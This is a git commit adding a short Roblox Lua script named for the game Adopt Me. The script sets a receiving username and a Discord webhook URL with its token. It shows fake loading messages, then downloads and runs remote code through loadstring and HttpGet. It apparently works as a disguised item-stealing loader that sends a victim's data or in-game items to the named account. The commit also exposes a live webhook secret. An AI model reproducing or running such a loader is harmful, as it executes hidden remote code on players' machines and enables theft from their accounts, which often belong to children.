254317a6ac574197dad57fdbd2a0a1da7307f046
vitolkn <vitolkn99@gmail.com>
2025-01-17 22:37:24 -0300

    Create Adoptme.lua

---
+++ Adoptme.lua
@@ -0,0 +1,9 @@
+Username = "vitinZzica"
+WebHook = "https://discord.com/api/webhooks/1329821094252904458/bP0JimgLmgub0_cqsjrFUBo4TMy-zbl0FkVB5kYc9QeQ641KlqSU_A0WD983cBDvK40B"
+
+_G.CustomScriptName = "Coen"
+_G.Text1 = "Script Loaded..."
+_G.Text2 = "Waiting for Script"
+_G.Text3 = "Checking Scripts..."
+_G.Text4 = "Starting Scripts..."
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/ReQiuYTPL/hub/main/ReQiuYTPLHub.lua'),true))()
